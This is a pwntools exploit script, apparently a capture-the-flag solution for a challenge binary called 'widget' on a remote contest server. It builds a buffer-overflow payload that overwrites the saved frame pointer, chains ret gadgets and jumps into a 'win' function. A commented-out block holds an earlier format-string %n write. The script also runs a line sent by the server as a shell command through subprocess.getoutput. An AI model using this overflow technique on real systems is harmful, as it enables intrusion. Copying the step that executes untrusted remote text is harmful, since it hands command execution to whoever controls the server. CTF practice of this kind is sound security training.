from pwn import *
import subprocess
context.binary=exe=ELF("./widget",checksec=False)
#libc=ELF('./libc_32.so.6',checksec=False)
#p=process(exe.path)
p=remote('challs.actf.co' ,31320)
'''
called=0x40402c
puts_got=0x403f98
payload=p64(called)
payload+=f'%{0x100000000}c%8$n'.encode()
payload=payload.ljust(40,b'P')+p64(exe.sym['main'])
ret=0x000000000040101a
'''
ret=0x000000000040101a
offset=40
def GDB():
    gdb.attach(p,gdbscript=
        '''
        b*0x00000000004014c0
        b*0x00000000004014c7
        c

        ''')
    input()
#GDB()
###############################
p.recvuntil(b"proof of work: ")
foo = p.recvline().decode()
print(foo)
resultCapcha = subprocess.getoutput(foo)
print(resultCapcha)
p.sendline(resultCapcha)
###############################
arg1=0x402008
arg2=0x403029
rw_section=0x00000000404a00
payload=b"\x00"*(offset-8)+p64(rw_section)
payload+=p64(ret)+p64(ret)
payload+=p64(exe.sym['win']+117)

p.sendlineafter(b"Amount: ",b"100")
p.sendlineafter(b'Contents: ',payload)

p.interactive()